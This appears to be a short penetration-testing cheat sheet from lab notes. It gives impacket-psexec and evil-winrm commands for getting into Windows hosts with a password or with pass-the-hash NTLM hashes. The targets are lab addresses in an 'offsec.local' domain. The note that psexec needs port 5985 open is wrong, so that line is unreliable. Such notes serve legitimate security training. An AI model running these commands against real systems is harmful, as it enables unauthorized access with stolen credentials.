## Impacket-psexec
If you have credentials and port 5985 is open you can acces with following command:
```bash
impacket-psexec offsec.local/Allison:'RockYou!'@192.168.143.59
```
With hash:
```bash
impacket-psexec "Administrator":@192.168.143.59 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -d offsec.local
```

## Evil-WinRM
If you have a list of NTLM hashes you can use:
```bash
evil-winrm -i 192.168.197.170 -u 'dave' -H 'd3774a8e42207941fbe832e77ff0dc6f'
```